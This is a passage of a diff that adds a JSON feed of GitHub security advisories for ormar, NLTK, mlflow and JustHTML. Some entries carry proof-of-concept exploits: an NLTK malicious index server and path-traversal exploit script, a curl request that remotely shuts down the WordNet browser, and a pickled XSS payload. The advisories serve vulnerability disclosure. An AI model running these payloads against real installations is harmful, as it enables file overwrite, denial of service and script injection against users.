`_pk_only=True` as a named argument. Keyword-only parameters prefixed with `_` cannot be injected via JSON body deserialization or `Model(**user_dict)` unpacking.",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": "https://api.github.com/repos/ormar-orm/ormar/security-advisories/GHSA-f964-whrq-44h8",
+      "source_code_location": "https://github.com/ormar-orm/ormar",
+      "identifiers": [
+        {
+          "value": "GHSA-f964-whrq-44h8",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-27953",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/ormar-orm/ormar/security/advisories/GHSA-f964-whrq-44h8",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-27953",
+        "https://github.com/ormar-orm/ormar/commit/7f22aa21a7614b993970345b392dabb0ccde0ab3",
+        "https://github.com/ormar-orm/ormar/blob/master/examples/fastapi_quick_start.py#L55",
+        "https://github.com/ormar-orm/ormar/blob/master/ormar/fields/foreign_key.py#L41",
+        "https://github.com/ormar-orm/ormar/blob/master/ormar/models/helpers/pydantic.py#L108",
+        "https://github.com/ormar-orm/ormar/blob/master/ormar/models/model.py#L89",
+        "https://github.com/ormar-orm/ormar/blob/master/ormar/models/newbasemodel.py#L128",
+        "https://github.com/ormar-orm/ormar/blob/master/ormar/models/newbasemodel.py#L292",
+        "https://github.com/ormar-orm/ormar/releases/tag/0.23.1",
+        "https://github.com/advisories/GHSA-f964-whrq-44h8"
+      ],
+      "published_at": "2026-03-19T16:27:43Z",
+      "updated_at": "2026-03-20T21:35:14Z",
+      "github_reviewed_at": "2026-03-19T16:27:43Z",
+      "nvd_published_at": "2026-03-19T21:17:09Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "ormar"
+          },
+          "vulnerable_version_range": "<= 0.23.0",
+          "first_patched_version": "0.23.1",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L",
+          "score": 7.1
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-20",
+          "name": "Improper Input Validation"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "Mistz1",
+            "id": 100209150,
+            "node_id": "U_kgDOBfkR_g",
+            "avatar_url": "https://avatars.githubusercontent.com/u/100209150?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/Mistz1",
+            "html_url": "https://github.com/Mistz1",
+            "followers_url": "https://api.github.com/users/Mistz1/followers",
+            "following_url": "https://api.github.com/users/Mistz1/following{/other_user}",
+            "gists_url": "https://api.github.com/users/Mistz1/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/Mistz1/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/Mistz1/subscriptions",
+            "organizations_url": "https://api.github.com/users/Mistz1/orgs",
+            "repos_url": "https://api.github.com/users/Mistz1/repos",
+            "events_url": "https://api.github.com/users/Mistz1/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/Mistz1/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L",
+        "score": 7.1
+      },
+      "epss": {
+        "percentage": 0.00037,
+        "percentile": 0.10965
+      }
+    }
+  },
+  {
+    "id": "GHSA-469j-vmhf-r6v7",
+    "source": "github",
+    "type": "advisory",
+    "title": "NLTK has a Downloader Path Traversal Vulnerability (AFO) - Arbitrary File Overwrite",
+    "description": "## Vulnerability Description\n\nThe NLTK downloader does not validate the `subdir` and `id` attributes when processing remote XML index files. Attackers can control a remote XML index server to provide malicious values containing path traversal sequences (such as `../`), which can lead to:\n\n1. **Arbitrary Directory Creation**: Create directories at arbitrary locations in the file system\n2. **Arbitrary File Creation**: Create arbitrary files\n3. **Arbitrary File Overwrite**: Overwrite critical syste",
+    "severity": "high",
+    "published_at": "2026-03-19T12:42:42Z",
+    "attack_patterns": [
+      "execute",
+      "remote",
+      "code",
+      "path",
+      "traversal"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-469j-vmhf-r6v7",
+      "cve_id": "CVE-2026-33236",
+      "url": "https://api.github.com/advisories/GHSA-469j-vmhf-r6v7",
+      "html_url": "https://github.com/advisories/GHSA-469j-vmhf-r6v7",
+      "summary": "NLTK has a Downloader Path Traversal Vulnerability (AFO) - Arbitrary File Overwrite",
+      "description": "## Vulnerability Description\n\nThe NLTK downloader does not validate the `subdir` and `id` attributes when processing remote XML index files. Attackers can control a remote XML index server to provide malicious values containing path traversal sequences (such as `../`), which can lead to:\n\n1. **Arbitrary Directory Creation**: Create directories at arbitrary locations in the file system\n2. **Arbitrary File Creation**: Create arbitrary files\n3. **Arbitrary File Overwrite**: Overwrite critical system files (such as `/etc/passwd`, `~/.ssh/authorized_keys`, etc.)\n\n## Vulnerability Principle\n\n### Key Code Locations\n\n**1. XML Parsing Without Validation** (`nltk/downloader.py:253`)\n```python\nself.filename = os.path.join(subdir, id + ext)\n```\n- `subdir` and `id` are directly from XML attributes without any validation\n\n**2. Path Construction Without Checks** (`nltk/downloader.py:679`)\n```python\nfilepath = os.path.join(download_dir, info.filename)\n```\n- Directly uses `filename` which may contain path traversal\n\n**3. Unrestricted Directory Creation** (`nltk/downloader.py:687`)\n```python\nos.makedirs(os.path.join(download_dir, info.subdir), exist_ok=True)\n```\n- Can create arbitrary directories outside the download directory\n\n**4. File Writing Without Protection** (`nltk/downloader.py:695`)\n```python\nwith open(filepath, \"wb\") as outfile:\n```\n- Can write to arbitrary locations in the file system\n\n### Attack Chain\n\n```\n1. Attacker controls remote XML index server\n   ↓\n2. Provides malicious XML: <package id=\"passwd\" subdir=\"../../etc\" .../>\n   ↓\n3. Victim executes: downloader.download('passwd')\n   ↓\n4. Package.fromxml() creates object, filename = \"../../etc/passwd.zip\"\n   ↓\n5. _download_package() constructs path: download_dir + \"../../etc/passwd.zip\"\n   ↓\n6. os.makedirs() creates directory: download_dir + \"../../etc\"\n   ↓\n7. open(filepath, \"wb\") writes file to /etc/passwd.zip\n   ↓\n8. System file is overwritten!\n```\n\n## Impact Scope\n1. **System File Overwrite**\n\n## Reproduction Steps\n\n### Environment Setup\n\n1. Install NLTK\n```bash\npip install nltk\n```\n\n2. Prepare malicious server and exploit script (see PoC section)\n\n### Reproduction Process\n\n**Step 1: Start malicious server**\n```bash\npython3 malicious_server.py\n```\n\n**Step 2: Run exploit script**\n```bash\npython3 exploit_vulnerability.py\n```\n\n**Step 3: Verify results**\n```bash\nls -la /tmp/test_file.zip\n```\n\n## Proof of Concept\n\n### Malicious Server (malicious_server.py)\n\n```python\n#!/usr/bin/env python3\n\"\"\"Malicious HTTP Server - Provides XML index with path traversal\"\"\"\nimport os\nimport tempfile\nimport zipfile\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\n# Create temporary directory\nserver_dir = tempfile.mkdtemp(prefix=\"nltk_malicious_\")\n\n# Create malicious XML (contains path traversal)\nmalicious_xml = \"\"\"<?xml version=\"1.0\"?>\n<nltk_data>\n  <packages>\n    <package id=\"test_file\" subdir=\"../../../../../../../../../tmp\" \n             url=\"http://127.0.0.1:8888/test.zip\" \n             size=\"100\" unzipped_size=\"100\" unzip=\"0\"/>\n  </packages>\n</nltk_data>\n\"\"\"\n\n# Save files\nwith open(os.path.join(server_dir, \"malicious_index.xml\"), \"w\") as f:\n    f.write(malicious_xml)\n\nwith zipfile.ZipFile(os.path.join(server_dir, \"test.zip\"), \"w\") as zf:\n    zf.writestr(\"test.txt\", \"Path traversal attack!\")\n\n# HTTP Handler\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == '/malicious_index.xml':\n            self.send_response(200)\n            self.send_header('Content-type', 'application/xml')\n            self.end_headers()\n            with open(os.path.join(server_dir, 'malicious_index.xml'), 'rb') as f:\n                self.wfile.write(f.read())\n        elif self.path == '/test.zip':\n            self.send_response(200)\n            self.send_header('Content-type', 'application/zip')\n            self.end_headers()\n            with open(os.path.join(server_dir, 'test.zip'), 'rb') as f:\n                self.wfile.write(f.read())\n        else:\n            self.send_response(404)\n            self.end_headers()\n    \n    def log_message(self, format, *args):\n        pass\n\n# Start server\nif __name__ == \"__main__\":\n    port = 8888\n    server = HTTPServer((\"0.0.0.0\", port), Handler)\n    print(f\"Malicious server started: http://127.0.0.1:{port}/malicious_index.xml\")\n    print(\"Press Ctrl+C to stop\")\n    try:\n        server.serve_forever()\n    except KeyboardInterrupt:\n        print(\"\\nServer stopped\")\n```\n\n### Exploit Script (exploit_vulnerability.py)\n\n```python\n#!/usr/bin/env python3\n\"\"\"AFO Vulnerability Exploit Script\"\"\"\nimport os\nimport tempfile\n\ndef exploit(server_url=\"http://127.0.0.1:8888/malicious_index.xml\"):\n    download_dir = tempfile.mkdtemp(prefix=\"nltk_exploit_\")\n    print(f\"Download directory: {download_dir}\")\n    \n    # Exploit vulnerability\n    from nltk.downloader import Downloader\n    downloader = Downloader(server_index_url=server_url, download_dir=download_dir)\n    downloader.download(\"test_file\", quiet=True)\n    \n    # Check results\n    expected_path = \"/tmp/test_file.zip\"\n    if os.path.exists(expected_path):\n        print(f\"\\n✗ Exploit successful! File written to: {expected_path}\")\n        print(f\"✗ Path traversal attack successful!\")\n    else:\n        print(f\"\\n? File not found, download may have failed\")\n\nif __name__ == \"__main__\":\n    exploit()\n```\n\n### Execution Results\n\n```\n✗ Exploit successful! File written to: /tmp/test_file.zip\n✗ Path traversal attack successful!\n```",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": "https://api.github.com/repos/nltk/nltk/security-advisories/GHSA-469j-vmhf-r6v7",
+      "source_code_location": "https://github.com/nltk/nltk",
+      "identifiers": [
+        {
+          "value": "GHSA-469j-vmhf-r6v7",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33236",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/nltk/nltk/security/advisories/GHSA-469j-vmhf-r6v7",
+        "https://github.com/advisories/GHSA-469j-vmhf-r6v7"
+      ],
+      "published_at": "2026-03-19T12:42:42Z",
+      "updated_at": "2026-03-19T12:42:43Z",
+      "github_reviewed_at": "2026-03-19T12:42:42Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "nltk"
+          },
+          "vulnerable_version_range": "<= 3.9.2",
+          "first_patched_version": null,
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H",
+          "score": 8.1
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        }
+      ],
+      "credits": [],
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H",
+        "score": 8.1
+      },
+      "epss": {
+        "percentage": 0.00043,
+        "percentile": 0.12992
+      }
+    }
+  },
+  {
+    "id": "GHSA-jm6w-m3j8-898g",
+    "source": "github",
+    "type": "advisory",
+    "title": "Unauthenticated remote shutdown in nltk.app.wordnet_app",
+    "description": "### Summary\n`nltk.app.wordnet_app` allows unauthenticated remote shutdown of the local WordNet Browser HTTP server when it is started in its default mode. A simple `GET /SHUTDOWN%20THE%20SERVER` request causes the process to terminate immediately via `os._exit(0)`, resulting in a denial of service.\n\n### Details\nThe vulnerable logic is in `nltk/app/wordnet_app.py`:\n\n- [`nltk/app/wordnet_app.py:242`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L242)\n  - The server listens on all interfac",
+    "severity": "high",
+    "published_at": "2026-03-19T12:42:20Z",
+    "attack_patterns": [
+      "remote",
+      "code",
+      "path",
+      "csrf"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-jm6w-m3j8-898g",
+      "cve_id": "CVE-2026-33231",
+      "url": "https://api.github.com/advisories/GHSA-jm6w-m3j8-898g",
+      "html_url": "https://github.com/advisories/GHSA-jm6w-m3j8-898g",
+      "summary": "Unauthenticated remote shutdown in nltk.app.wordnet_app",
+      "description": "### Summary\n`nltk.app.wordnet_app` allows unauthenticated remote shutdown of the local WordNet Browser HTTP server when it is started in its default mode. A simple `GET /SHUTDOWN%20THE%20SERVER` request causes the process to terminate immediately via `os._exit(0)`, resulting in a denial of service.\n\n### Details\nThe vulnerable logic is in `nltk/app/wordnet_app.py`:\n\n- [`nltk/app/wordnet_app.py:242`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L242)\n  - The server listens on all interfaces:\n  - `server = HTTPServer((\"\", port), MyServerHandler)`\n\n- [`nltk/app/wordnet_app.py:87`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L87)\n  - Incoming requests are checked for the exact path:\n  - `if unquote_plus(sp) == \"SHUTDOWN THE SERVER\":`\n\n- [`nltk/app/wordnet_app.py:88`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L88)\n  - The shutdown protection only depends on `server_mode`\n\n- [`nltk/app/wordnet_app.py:93`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L93)\n  - In the default mode (`runBrowser=True`, therefore `server_mode=False`), the handler terminates the process directly:\n  - `os._exit(0)`\n\nThis means any party that can reach the listening port can stop the service with a single unauthenticated GET request when the browser is started in its normal mode.\n\n### PoC\n1. Start the WordNet Browser in Docker in its default mode:\n\n```bash\ndocker run -d --name nltk-wordnet-web-default-retest -p 8004:8004 \\\n  nltk-sandbox \\\n  python -c \"import nltk; nltk.download('wordnet', quiet=True); from nltk.app.wordnet_app import wnb; wnb(8004, True)\"\n```\n\n2. Confirm the service is reachable:\n\n```bash\ncurl -s -o /tmp/wn_before.html -w '%{http_code}\\n' 'http://127.0.0.1:8004/'\n```\n\nObserved result:\n\n```text\n200\n```\n\n3. Trigger shutdown:\n\n```bash\ncurl -s -o /tmp/wn_shutdown.html -w '%{http_code}\\n' 'http://127.0.0.1:8004/SHUTDOWN%20THE%20SERVER'\n```\n\nObserved result:\n\n```text\n000\n```\n\n4. Verify the service is no longer available:\n\n```bash\ncurl -s -o /tmp/wn_after.html -w '%{http_code}\\n' 'http://127.0.0.1:8004/'\ndocker ps -a --filter name=nltk-wordnet-web-default-retest --format '{{.Names}}\\t{{.Status}}'\ndocker logs nltk-wordnet-web-default-retest\n```\n\nObserved results:\n\n```text\n000\nnltk-wordnet-web-default-retest    Exited (0)\nServer shutting down!\n```\n\n### Impact\nThis is an unauthenticated denial-of-service issue in the NLTK WordNet Browser HTTP server.\n\nAny reachable client can terminate the service remotely when the application is started in its default mode. The impact is limited to service availability, but it is still security-relevant because:\n\n- the route is accessible over HTTP\n- no authentication or CSRF-style confirmation is required\n- the server listens on all interfaces by default\n- the process exits immediately instead of performing a controlled shutdown\n\nThis primarily affects users who run `nltk.app.wordnet_app` and expose or otherwise allow access to its listening port.",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": "https://api.github.com/repos/nltk/nltk/security-advisories/GHSA-jm6w-m3j8-898g",
+      "source_code_location": "https://github.com/nltk/nltk",
+      "identifiers": [
+        {
+          "value": "GHSA-jm6w-m3j8-898g",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33231",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/nltk/nltk/security/advisories/GHSA-jm6w-m3j8-898g",
+        "https://github.com/advisories/GHSA-jm6w-m3j8-898g"
+      ],
+      "published_at": "2026-03-19T12:42:20Z",
+      "updated_at": "2026-03-19T12:42:23Z",
+      "github_reviewed_at": "2026-03-19T12:42:20Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "nltk"
+          },
+          "vulnerable_version_range": "<= 3.9.3",
+          "first_patched_version": null,
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-306",
+          "name": "Missing Authentication for Critical Function"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "leduckhuong",
+            "id": 86466393,
+            "node_id": "MDQ6VXNlcjg2NDY2Mzkz",
+            "avatar_url": "https://avatars.githubusercontent.com/u/86466393?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/leduckhuong",
+            "html_url": "https://github.com/leduckhuong",
+            "followers_url": "https://api.github.com/users/leduckhuong/followers",
+            "following_url": "https://api.github.com/users/leduckhuong/following{/other_user}",
+            "gists_url": "https://api.github.com/users/leduckhuong/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/leduckhuong/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/leduckhuong/subscriptions",
+            "organizations_url": "https://api.github.com/users/leduckhuong/orgs",
+            "repos_url": "https://api.github.com/users/leduckhuong/repos",
+            "events_url": "https://api.github.com/users/leduckhuong/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/leduckhuong/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "epss": {
+        "percentage": 0.00041,
+        "percentile": 0.12305
+      }
+    }
+  },
+  {
+    "id": "GHSA-fhff-qmm8-h2fp",
+    "source": "github",
+    "type": "advisory",
+    "title": "Arbitrary file write via tar traversal in mlflow",
+    "description": "A vulnerability in MLflow's pyfunc extraction process allows for arbitrary file writes due to improper handling of tar archive entries. Specifically, the use of `tarfile.extractall` without path validation enables crafted tar.gz files containing `..` or absolute paths to escape the intended extraction directory. This issue affects the latest version of MLflow and poses a high/critical risk in scenarios involving multi-tenant environments or ingestion of untrusted artifacts, as it can lead to arb",
+    "severity": "high",
+    "published_at": "2026-03-19T00:30:20Z",
+    "attack_patterns": [
+      "remote",
+      "code",
+      "path"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-fhff-qmm8-h2fp",
+      "cve_id": "CVE-2025-15031",
+      "url": "https://api.github.com/advisories/GHSA-fhff-qmm8-h2fp",
+      "html_url": "https://github.com/advisories/GHSA-fhff-qmm8-h2fp",
+      "summary": "Arbitrary file write via tar traversal in mlflow",
+      "description": "A vulnerability in MLflow's pyfunc extraction process allows for arbitrary file writes due to improper handling of tar archive entries. Specifically, the use of `tarfile.extractall` without path validation enables crafted tar.gz files containing `..` or absolute paths to escape the intended extraction directory. This issue affects the latest version of MLflow and poses a high/critical risk in scenarios involving multi-tenant environments or ingestion of untrusted artifacts, as it can lead to arbitrary file overwrites and potential remote code execution.",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": null,
+      "source_code_location": "https://github.com/mlflow/mlflow",
+      "identifiers": [
+        {
+          "value": "GHSA-fhff-qmm8-h2fp",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2025-15031",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-15031",
+        "https://huntr.com/bounties/09856f77-f968-446f-a930-657d126efe4e",
+        "https://github.com/mlflow/mlflow/commit/3bf6d81ac4d38654c8ff012dbd0c3e9f17e7e346",
+        "https://github.com/mlflow/mlflow/blob/fe4d9be330426904283401f1d2ed914238b6fc37/mlflow/pyfunc/dbconnect_artifact_cache.py#L140",
+        "https://github.com/advisories/GHSA-fhff-qmm8-h2fp"
+      ],
+      "published_at": "2026-03-19T00:30:20Z",
+      "updated_at": "2026-03-19T17:56:47Z",
+      "github_reviewed_at": "2026-03-19T17:56:46Z",
+      "nvd_published_at": "2026-03-18T23:17:28Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "mlflow"
+          },
+          "vulnerable_version_range": "< 3.9.0rc0",
+          "first_patched_version": "3.9.0rc0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+          "score": 8.1
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        }
+      ],
+      "credits": [],
+      "cvss": {
+        "vector_string": "CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "score": 8.1
+      },
+      "epss": {
+        "percentage": 0.0003,
+        "percentile": 0.08119
+      }
+    }
+  },
+  {
+    "id": "GHSA-gfwx-w7gr-fvh7",
+    "source": "github",
+    "type": "advisory",
+    "title": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in nltk",
+    "description": "### Summary\n`nltk.app.wordnet_app` contains a reflected cross-site scripting issue in the `lookup_...` route. A crafted `lookup_<payload>` URL can inject arbitrary HTML/JavaScript into the response page because attacker-controlled `word` data is reflected into HTML without escaping. This impacts users running the local WordNet Browser server and can lead to script execution in the browser origin of that application.\n\n### Details\nThe vulnerable flow is in `nltk/app/wordnet_app.py`:\n\n- [`nltk/app/",
+    "severity": "medium",
+    "published_at": "2026-03-18T20:23:33Z",
+    "attack_patterns": [
+      "inject",
+      "execute",
+      "xss",
+      "code"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-gfwx-w7gr-fvh7",
+      "cve_id": "CVE-2026-33230",
+      "url": "https://api.github.com/advisories/GHSA-gfwx-w7gr-fvh7",
+      "html_url": "https://github.com/advisories/GHSA-gfwx-w7gr-fvh7",
+      "summary": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in nltk",
+      "description": "### Summary\n`nltk.app.wordnet_app` contains a reflected cross-site scripting issue in the `lookup_...` route. A crafted `lookup_<payload>` URL can inject arbitrary HTML/JavaScript into the response page because attacker-controlled `word` data is reflected into HTML without escaping. This impacts users running the local WordNet Browser server and can lead to script execution in the browser origin of that application.\n\n### Details\nThe vulnerable flow is in `nltk/app/wordnet_app.py`:\n\n- [`nltk/app/wordnet_app.py:144`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L144)\n  - Requests starting with `lookup_` are handled as HTML responses:\n  - `page, word = page_from_href(sp)`\n\n- [`nltk/app/wordnet_app.py:755`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L755)\n  - `page_from_href()` calls `page_from_reference(Reference.decode(href))`\n\n- [`nltk/app/wordnet_app.py:769`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L769)\n  - `word = href.word`\n\n- [`nltk/app/wordnet_app.py:796`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L796)\n  - If no results are found, `word` is inserted directly into the HTML body:\n  - `body = \"The word or words '%s' were not found in the dictionary.\" % word`\n\nThis is inconsistent with the `search` route, which does escape user input:\n\n- [`nltk/app/wordnet_app.py:136`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L136)\n  - `word = html.escape(...)`\n\nAs a result, a malicious `lookup_...` payload can inject script into the response page.\n\nThe issue is exploitable because:\n\n- `Reference.decode()` accepts attacker-controlled base64-encoded pickle data for the URL state.\n- The decoded `word` is reflected into HTML without `html.escape()`.\n- The server is started with `HTTPServer((\"\", port), MyServerHandler)`, so it listens on all interfaces by default, not just `localhost`.\n\n### PoC\n1. Start the WordNet Browser in an isolated Docker environment:\n\n```bash\ndocker run -d --name nltk-wordnet-web -p 8002:8002 \\\n  nltk-sandbox \\\n  python -c \"import nltk; nltk.download('wordnet', quiet=True); from nltk.app.wordnet_app import wnb; wnb(8002, False)\"\n```\n\n2. Use the following crafted payload, which decodes to:\n\n```python\n(\"<script>alert(1)</script>\", {})\n```\n\nEncoded payload:\n\n```text\ngAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4=\n```\n\n3. Request the vulnerable route:\n\n```bash\ncurl -s \"http://127.0.0.1:8002/lookup_gAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4=\"\n```\n\n4. Observed result:\n\n```text\nThe word or words '<script>alert(1)</script>' were not found in the dictionary.\n```\n<img width=\"867\" height=\"208\" alt=\"127\" src=\"https://github.com/user-attachments/assets/ec09da08-09bc-4fc4-bfc1-c4489e9adaf6\" />\n\n\nI also validated the issue directly at function level in Docker:\n\n```python\nimport base64\nimport pickle\n\nfrom nltk.app.wordnet_app import page_from_href\n\npayload = base64.urlsafe_b64encode(\n    pickle.dumps((\"<script>alert(1)</script>\", {}), -1)\n).decode()\n\npage, word = page_from_href(payload)\nprint(word)\nprint(\"<script>alert(1)</script>\" in page)\n```\n\nObserved output:\n\n```text\nWORD= <script>alert(1)</script>\nHAS_SCRIPT= True\n```\n\n### Impact\nThis is a reflected XSS issue in the NLTK WordNet Browser web UI.\n\nAn attacker who can convince a user to open a crafted `lookup_...` URL can execute arbitrary JavaScript in the origin of the local WordNet Browser application. This can be used to:\n\n- run arbitrary script in the browser tab\n- manipulate the page content shown to the user\n- issue same-origin requests to other WordNet Browser routes\n- potentially trigger available UI actions in that local app context\n\nThis primarily impacts users who run `nltk.app.wordnet_app` as a local or self-hosted HTTP service and open attacker-controlled links.",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": "https://api.github.com/repos/nltk/nltk/security-advisories/GHSA-gfwx-w7gr-fvh7",
+      "source_code_location": "https://github.com/nltk/nltk",
+      "identifiers": [
+        {
+          "value": "GHSA-gfwx-w7gr-fvh7",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33230",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/nltk/nltk/security/advisories/GHSA-gfwx-w7gr-fvh7",
+        "https://github.com/nltk/nltk/commit/1c3f799607eeb088cab2491dcf806ae83c29ad8f",
+        "https://github.com/advisories/GHSA-gfwx-w7gr-fvh7"
+      ],
+      "published_at": "2026-03-18T20:23:33Z",
+      "updated_at": "2026-03-19T06:51:54Z",
+      "github_reviewed_at": "2026-03-18T20:23:33Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "nltk"
+          },
+          "vulnerable_version_range": "<= 3.9.3",
+          "first_patched_version": null,
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "score": 6.1
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-79",
+          "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "leduckhuong",
+            "id": 86466393,
+            "node_id": "MDQ6VXNlcjg2NDY2Mzkz",
+            "avatar_url": "https://avatars.githubusercontent.com/u/86466393?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/leduckhuong",
+            "html_url": "https://github.com/leduckhuong",
+            "followers_url": "https://api.github.com/users/leduckhuong/followers",
+            "following_url": "https://api.github.com/users/leduckhuong/following{/other_user}",
+            "gists_url": "https://api.github.com/users/leduckhuong/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/leduckhuong/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/leduckhuong/subscriptions",
+            "organizations_url": "https://api.github.com/users/leduckhuong/orgs",
+            "repos_url": "https://api.github.com/users/leduckhuong/repos",
+            "events_url": "https://api.github.com/users/leduckhuong/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/leduckhuong/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "score": 6.1
+      },
+      "epss": {
+        "percentage": 0.00033,
+        "percentile": 0.09587
+      }
+    }
+  },
+  {
+    "id": "GHSA-3rcm-vjrc-p45j",
+    "source": "github",
+    "type": "advisory",
+    "title": "JustHTML has a Sanitizer Bypass (in Markdown)",
+    "description": "## Summary\n\n`to_markdown()` does not sufficiently escape text content that looks like HTML. As a result, untrusted input that is safe in `to_html()` can become raw HTML in Markdown output.\n\nThis is not specific to tokenizer raw-text states like `<title>`, `<noscript>`, or `<plaintext>`, although those states can trigger the behavior. The root cause is broader: Markdown text serialization leaves angle brackets unescaped in text nodes.\n\n## Details\n\nWhen converting a parsed document to Markdown, te",
+    "severity": "medium",
+    "published_at": "2026-03-18T20:19:56Z",
+    "attack_patterns": [
+      "code"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-3rcm-vjrc-p45j",
+      "cve_id": null,
